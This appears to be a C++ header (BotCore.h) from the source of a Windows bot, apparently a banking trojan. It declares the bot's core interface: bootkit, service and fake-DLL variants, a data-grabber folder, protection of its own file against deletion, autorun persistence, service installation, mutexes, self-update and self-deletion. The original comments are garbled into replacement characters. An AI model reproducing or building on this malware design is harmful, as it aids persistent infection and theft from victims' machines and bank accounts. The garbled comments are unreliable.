//---------------------------------------------------------------------------
//  �������� ������ ����, ������������ � ���� ������� ������
//---------------------------------------------------------------------------

#ifndef BotCoreH
#define BotCoreH
//---------------------------------------------------------------------------

// ���������� ������ ��� ������ � WINAPI � ����
#include "GetApi.h"

// ������ ��� ������ � �������
#include "Memory.h"

// ������ ��� ������ �� ��������
#include "Strings.h"

// ������ ����������
#include "Crypt.h"

// ������� ��������� ����
#include "Config.h"


// ������ ������� ������
#include "Utils.h"

// ������ ��� ������ � HTTP
#include "BotHTTP.h"


//*****************************************************************************
//  ���� ������ �� ���������� � ����� ����������
//  ���� ������ ������������� ������ ������
//  ������ ���������� � ���� ��� �������������� ������
//  �������� ���������� ����
//  ��-�� ���� �� ����������� ������������� ��������������
//  ������� ������ �� ����� ������ �������� ���� ������
//*****************************************************************************
#include "Modules.h"



//--------------------------------------------
// ��� ����
//--------------------------------------------
enum TBotType { BotRing3   = 0,
				BotService = 1,
				BotFakeDll = 2,
				BotBootkit = 3};


//--------------------------------------------
// ��� ����������� ��������
//--------------------------------------------
enum TProcessType { ProcessUnknown  = 0,
					ProcessExplorer = 1,
					ProcessLoader   = 2,
					ProcessService  = 3};





//***********************************************************
//  TBotApplication - ����� �������������� ������� �
//                    �������� �������� ����
//***********************************************************
class TBotApplication : public TBotObject
{
private:
	bool   FTerminated;
	DWORD  FPID;
    string FUID;
	string FApplicationName;
	string FPerfixFileName;
	string FWorkPath;
	string FGrabberPath;

	string MakeWorkPath(bool SystemPath);
	PCHAR  GetWorkFolder(); // ������� ���������� ��� ������� ����� ����
public:
	TBotApplication();
	~TBotApplication();

	DWORD  PID();
	string UID();


	string ApplicationName(); // ��� ���������� � ������� �������� ���
	string PrefixFileName();  // ������� ���������� ��� ����� ��� �������� ��������
	string WorkPath();        // ���� � �������� �������� ����
	string GrabberPath();     // ���� � �������� �������� ������� ������

	string MakePath(const char* SubDirectory);   // ������� �������� ���� � ��������� ��������������
	string MakePath(const string &SubDirectory);

	string CreateFile(const char* SubDir, const char* FileName);    // ������� ������ ���� � ������� �������� ����
	string CreateFile(const string &SubDir, const char* FileName);

	string MakeFileName(const char* SubDir, const char* FileName);  // ������� �������� ��� ����� � ������� ����� ����
	string MakeFileName(const string &SubDir, const char* FileName);

	bool   FileExists(const char* SubDir, const char* FileName);    // ������� ��������� ������� ����� � ������� ����� ����
	bool   FileExists(const string &SubDir, const char* FileName);

	bool   Terminated();
};




//*****************************************************************************
//  Bot - ������ ��� ����������� ������ ���� ����
//*****************************************************************************
namespace BOT
{
	//----------------------------------------------------
	//  Initialize - ������� �������������� ����������
	//				 ��������� ����
	//----------------------------------------------------
    void Initialize(TProcessType ProcessType = ProcessUnknown);

	//�������������� ������ ������� ������ ������� API, ����� ��� ������� �� ��� �������
	//Initialize() �� �������� ��� ������ �� ��� �������, ������ �� ���������� ������ Bot = new TBotApplication();, ����� �������� ������
	void InitializeApi();

	//----------------------------------------------------
	// ������� ���������� ������� ������� ����
	//
	// SubDir - ����������, ������� ����� �������� �
	//          ����������� ����������.
	//          �� ������ ���������� �� �����, �� ������
	//			�� �������������
	//
	// FileName - ��� �����, ������� ����� ��������� �
	//			  ����������� ��������
	//----------------------------------------------------
	PCHAR GetWorkPath(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkPathInSysDrive - ������ ������� GetWorkPath.
	//  	������� �� ����� �� ��� � ���, ��� �����
	//      �������� � ����� ���������� �����
	//----------------------------------------------------
	PCHAR GetWorkPathInSysDrive(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkFolderHash - ������� ���������� ���
	//  	                   ����� ������� �����
	//----------------------------------------------------
	DWORD GetWorkFolderHash();

	//----------------------------------------------------
	//  GetBotFileName - ������� ���������� ��� ����� ����
	//----------------------------------------------------
	PCHAR GetBotExeName();

	//----------------------------------------------------
	//  GetBotExeNameHash - ������� ���������� ��� ���
	//						����� ����
	//----------------------------------------------------
    DWORD GetBotExeNameHash();

	//----------------------------------------------------
	//  GetBotFullExeName - ������� ���������� ������ ���
	//						����� ����
	//----------------------------------------------------
	PCHAR GetBotFullExeName();

	//----------------------------------------------------
	//  GetServiceFullExeName - ������� ���������� ������
	//						    ��� ����� ������� ����
	//----------------------------------------------------
	string GetServiceFullExeName();


	//----------------------------------------------------
	// ������� �������� ��� ���� �� ��������
	//----------------------------------------------------
	void Protect(PCHAR FileName);

	//----------------------------------------------------
	// ������� ������� ������ � ��� ����� ����
	//----------------------------------------------------
	void Unprotect();

	//----------------------------------------------------
	// AddToAutoRun - ������� ��������� ��� � ������������
	//----------------------------------------------------
	bool AddToAutoRun(PCHAR FileName);

	//----------------------------------------------------
	// InstallService - ������� ����������� ��� ����
	//                  ��� ������
	// FileName - ��� ��� ����� ����
	//----------------------------------------------------
	bool InstallService(const char* FileName);

	//----------------------------------------------------
	// UninstallService - ������� �������������
	//                    ������ ����
	//----------------------------------------------------
	bool UninstallService();

	//----------------------------------------------------
	// ExecuteService - ������� ��������� ����������
	//                  �������
	//----------------------------------------------------
	void ExecuteService();


	//----------------------------------------------------
	// IsService - ������� ���������� ������ ����
	//             ������� ������� �������� ��������
	//----------------------------------------------------
	bool IsService();

	//----------------------------------------------------
	//  BotExeMD5 - ������� ���������� MD5 ��� ��� ����
	//----------------------------------------------------
    string BotExeMD5();

	//----------------------------------------------------
	//  TryCreatBotInstance - ������� ���������� 
	//  ����� ��������, �� ������� �������� ��������
	//  �������� ��� ���� ��������� ������� ������.
	//----------------------------------------------------
	HANDLE TryCreateBotInstance();

	//������� ������� ��� �������, ���� ���������� 0, �� ������ ��� ���-�� ��� ������ 
	HANDLE CreateBootkitMutex();
	//���������� true, ���� ������� ��� �� ��� �������
	bool BootkitIsRun();

	//----------------------------------------------------
	//  IsRunning - ������� ���������� ������ ���� �
	//  ������� ��� ������� ��������� ����
	//----------------------------------------------------
	bool IsRunning();

	//----------------------------------------------------
	//  SendProcessMessage - ������� ���������� ���������
	//  ���������� ��������
	//----------------------------------------------------
	bool SendProcessMessage(TProcessType Process, const string &Mesage);


	//----------------------------------------------------
	//  Delete - ������� ������� ��� ����
	//----------------------------------------------------
    void Delete();

	//������� ���� (����) ����
	void DeleteBotFile( const char* FileName );



	//----------------------------------------------------
	//  ������� �����������/�������� ��������� ����
	//----------------------------------------------------
	void SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists);
	void DeleteSettings();

	//----------------------------------------------------
	//  ������� ���������/��������� ���� ����
	//----------------------------------------------------
	void     SetBotType(TBotType Type);
	TBotType GetBotType();


	//----------------------------------------------------
	//  MakeUpdate - ������� ��������� ����
	//----------------------------------------------------
	bool MakeUpdate(const char *FileName, bool ResetSettings);
}

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
extern char BOT_UID[128];



//===================================================
//    ���������� ����� ���������� ����
//===================================================

extern TBotApplication* Bot;


//---------------------------------------------------------------------------
#endif
